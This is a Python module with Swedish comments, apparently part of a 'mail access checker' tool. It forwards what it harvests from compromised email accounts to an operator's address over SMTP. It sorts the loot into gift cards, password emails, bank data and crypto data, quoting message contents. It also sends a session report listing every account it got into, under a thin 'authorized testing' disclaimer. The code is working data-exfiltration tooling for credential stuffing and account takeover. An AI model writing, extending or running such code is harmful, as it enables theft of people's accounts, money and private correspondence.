"""
SMTP Client för automatisk vidarebefordring av funna resultat
"""

import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from typing import Dict, List, Any, Optional
from datetime import datetime
import json

from core.config import Config
from core.logger import MailAccessLogger
from core.exceptions import ConnectionError, AuthenticationError

class EmailForwarder:
    """Hanterar automatisk vidarebefordring av funna resultat"""
    
    def __init__(self, config: Config, logger: MailAccessLogger):
        self.config = config
        self.logger = logger
        self.smtp_connection = None
        
        # Konfiguration för forwarding (kan läggas till i config senare)
        self.forward_to_email = None  # Ska sättas från config eller CLI
        self.forward_from_email = None
        self.forward_password = None
        self.smtp_server = None
        self.smtp_port = 587
        
    def setup_forwarding(self, forward_to: str, forward_from: str, 
                        forward_password: str, smtp_server: str = None, 
                        smtp_port: int = 587):
        """Konfigurerar email forwarding"""
        self.forward_to_email = forward_to
        self.forward_from_email = forward_from
        self.forward_password = forward_password
        self.smtp_port = smtp_port
        
        if smtp_server:
            self.smtp_server = smtp_server
        else:
            # Auto-detect SMTP server baserat på email domain
            domain = forward_from.split('@')[-1].lower()
            self.smtp_server = self._get_smtp_server(domain)
            
        self.logger.info(f"Email forwarding konfigurerat: {forward_from} -> {forward_to}")
    
    def _get_smtp_server(self, domain: str) -> str:
        """Hämtar SMTP-server för domain"""
        smtp_servers = {
            'gmail.com': 'smtp.gmail.com',
            'hotmail.com': 'smtp-mail.outlook.com',
            'outlook.com': 'smtp-mail.outlook.com',
            'live.com': 'smtp-mail.outlook.com',
            'yahoo.com': 'smtp.mail.yahoo.com',
            'icloud.com': 'smtp.mail.me.com'
        }
        return smtp_servers.get(domain, f'smtp.{domain}')
    
    def forward_findings(self, source_email: str, crawl_results: Dict[str, Any]) -> bool:
        """Skickar funna resultat via email"""
        if not self._is_forwarding_configured():
            self.logger.warning("Email forwarding inte konfigurerat")
            return False
            
        try:
            # Kategorisera och skicka separata emails för olika typer
            if crawl_results.get('gift_cards'):
                self._send_gift_card_alert(source_email, crawl_results['gift_cards'])
                
            if crawl_results.get('passwords'):
                self._send_password_alert(source_email, crawl_results['passwords'])
                
            if crawl_results.get('bank_info'):
                self._send_bank_alert(source_email, crawl_results['bank_info'])
                
            if crawl_results.get('crypto_info'):
                self._send_crypto_alert(source_email, crawl_results['crypto_info'])
                
            return True
            
        except Exception as e:
            self.logger.error(f"Fel vid forwarding från {source_email}: {e}")
            return False
    
    def _send_gift_card_alert(self, source_email: str, gift_cards: List[Dict[str, Any]]):
        """Skickar alert för funna presentkort"""
        subject = f"🎁 PRESENTKORT FUNNET - {source_email}"
        
        body = f"""
PRESENTKORT UPPTÄCKT
=====================

Källa: {source_email}
Tid: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Antal funna: {len(gift_cards)}

DETALJER:
---------
"""
        
        for i, card in enumerate(gift_cards, 1):
            message = card['message']
            keyword = card['keyword']
            relevance = card.get('relevance', 'unknown')
            
            body += f"""
{i}. Meddelande ID: {message.get('id', 'N/A')}
   Ämne: {message.get('subject', 'N/A')[:100]}...
   Avsändare: {message.get('sender', 'N/A')}
   Datum: {message.get('date', 'N/A')}
   Nyckelord: {keyword}
   Relevans: {relevance}
   
   Innehåll (första 500 tecken):
   {message.get('body', '')[:500]}...
   
   ----------------------------------------
"""
        
        self._send_email(subject, body, priority='high')
    
    def _send_password_alert(self, source_email: str, passwords: List[Dict[str, Any]]):
        """Skickar alert för lösenordsrelaterade emails"""
        subject = f"🔐 LÖSENORD FUNNET - {source_email}"
        
        body = f"""
LÖSENORDSMAIL UPPTÄCKT
======================

Källa: {source_email}
Tid: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Antal funna: {len(passwords)}

DETALJER:
---------
"""
        
        for i, pwd in enumerate(passwords, 1):
            message = pwd['message']
            keyword = pwd['keyword']
            
            body += f"""
{i}. Meddelande ID: {message.get('id', 'N/A')}
   Ämne: {message.get('subject', 'N/A')}
   Avsändare: {message.get('sender', 'N/A')}
   Datum: {message.get('date', 'N/A')}
   Nyckelord: {keyword}
   
   Innehåll (första 300 tecken):
   {message.get('body', '')[:300]}...
   
   ----------------------------------------
"""
        
        self._send_email(subject, body, priority='high')
    
    def _send_bank_alert(self, source_email: str, bank_info: List[Dict[str, Any]]):
        """Skickar alert för bankrelated emails"""
        subject = f"💳 BANK/FINANSIELL INFO - {source_email}"
        
        body = f"""
BANK/FINANSIELL INFORMATION UPPTÄCKT
====================================

Källa: {source_email}
Tid: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Antal funna: {len(bank_info)}

DETALJER:
---------
"""
        
        for i, bank in enumerate(bank_info, 1):
            message = bank['message']
            keyword = bank['keyword']
            
            body += f"""
{i}. Meddelande ID: {message.get('id', 'N/A')}
   Ämne: {message.get('subject', 'N/A')}
   Avsändare: {message.get('sender', 'N/A')}
   Datum: {message.get('date', 'N/A')}
   Nyckelord: {keyword}
   
   ----------------------------------------
"""
        
        self._send_email(subject, body, priority='normal')
    
    def _send_crypto_alert(self, source_email: str, crypto_info: List[Dict[str, Any]]):
        """Skickar alert för kryptovaluta-relaterade emails"""
        subject = f"₿ KRYPTO INFO - {source_email}"
        
        body = f"""
KRYPTOVALUTA INFORMATION UPPTÄCKT
=================================

Källa: {source_email}
Tid: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Antal funna: {len(crypto_info)}

DETALJER:
---------
"""
        
        for i, crypto in enumerate(crypto_info, 1):
            message = crypto['message']
            keyword = crypto['keyword']
            
            body += f"""
{i}. Meddelande ID: {message.get('id', 'N/A')}
   Ämne: {message.get('subject', 'N/A')}
   Avsändare: {message.get('sender', 'N/A')}
   Datum: {message.get('date', 'N/A')}
   Nyckelord: {keyword}
   
   ----------------------------------------
"""
        
        self._send_email(subject, body, priority='normal')
    
    def _send_email(self, subject: str, body: str, priority: str = 'normal'):
        """Skickar email via SMTP"""
        if not self._is_forwarding_configured():
            return False
            
        try:
            # Skapa meddelande
            msg = MIMEMultipart()
            msg['From'] = self.forward_from_email
            msg['To'] = self.forward_to_email
            msg['Subject'] = subject
            
            # Sätt prioritet
            if priority == 'high':
                msg['X-Priority'] = '1'
                msg['X-MSMail-Priority'] = 'High'
            
            # Lägg till body
            msg.attach(MIMEText(body, 'plain', 'utf-8'))
            
            # Skicka email
            self._connect_smtp()
            
            text = msg.as_string()
            self.smtp_connection.sendmail(
                self.forward_from_email, 
                self.forward_to_email, 
                text
            )
            
            self.logger.info(f"Email skickat: {subject}")
            return True
            
        except Exception as e:
            self.logger.error(f"Fel vid emailsändning: {e}")
            return False
        finally:
            self._disconnect_smtp()
    
    def _connect_smtp(self):
        """Ansluter till SMTP-server"""
        try:
            # Skapa SMTP-anslutning
            self.smtp_connection = smtplib.SMTP(self.smtp_server, self.smtp_port)
            self.smtp_connection.starttls()  # Aktivera TLS
            
            # Autentisera
            self.smtp_connection.login(self.forward_from_email, self.forward_password)
            
            self.logger.debug(f"SMTP-anslutning etablerad till {self.smtp_server}")
            
        except Exception as e:
            raise ConnectionError(f"SMTP-anslutningsfel: {e}")
    
    def _disconnect_smtp(self):
        """Stänger SMTP-anslutning"""
        if self.smtp_connection:
            try:
                self.smtp_connection.quit()
            except:
                pass
            finally:
                self.smtp_connection = None
    
    def _is_forwarding_configured(self) -> bool:
        """Kontrollerar om forwarding är korrekt konfigurerat"""
        return all([
            self.forward_to_email,
            self.forward_from_email,
            self.forward_password,
            self.smtp_server
        ])
    
    def send_summary_report(self, session_results: List[Dict[str, Any]]):
        """Skickar sammanfattningsrapport för hela sessionen"""
        if not self._is_forwarding_configured():
            return False
            
        try:
            valid_accounts = [r for r in session_results if r.get('status') == 'valid']
            
            if not valid_accounts:
                return False
                
            subject = f"📊 MAIL CHECKER RAPPORT - {len(valid_accounts)} konton funna"
            
            body = f"""
MAIL ACCESS CHECKER - SESSIONSRAPPORT
====================================

Tid: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Totalt testade konton: {len(session_results)}
Framgångsrika anslutningar: {len(valid_accounts)}

FRAMGÅNGSRIKA KONTON:
====================
"""
            
            total_findings = {
                'gift_cards': 0,
                'passwords': 0,
                'bank_info': 0,
                'crypto_info': 0
            }
            
            for i, account in enumerate(valid_accounts, 1):
                email = account.get('email', 'N/A')
                message_count = account.get('message_count', 0)
                crawl_results = account.get('crawl_results', {})
                
                body += f"""
{i}. {email}
   Meddelanden: {message_count}
   Presentkort: {len(crawl_results.get('gift_cards', []))}
   Lösenord: {len(crawl_results.get('passwords', []))}
   Bank: {len(crawl_results.get('bank_info', []))}
   Krypto: {len(crawl_results.get('crypto_info', []))}
   
"""
                
                # Uppdatera totaler
                for key in total_findings:
                    total_findings[key] += len(crawl_results.get(key, []))
            
            body += f"""
TOTAL FUNNA OBJEKT:
==================
🎁 Presentkort: {total_findings['gift_cards']}
🔐 Lösenord: {total_findings['passwords']}
💳 Bank: {total_findings['bank_info']}
₿ Krypto: {total_findings['crypto_info']}

VARNING: Detta är automatiskt genererat från säkerhetstestning.
Använd endast information för auktoriserade ändamål.
"""
            
            self._send_email(subject, body, priority='normal')
            return True
            
        except Exception as e:
            self.logger.error(f"Fel vid sändning av sammanfattningsrapport: {e}")
            return False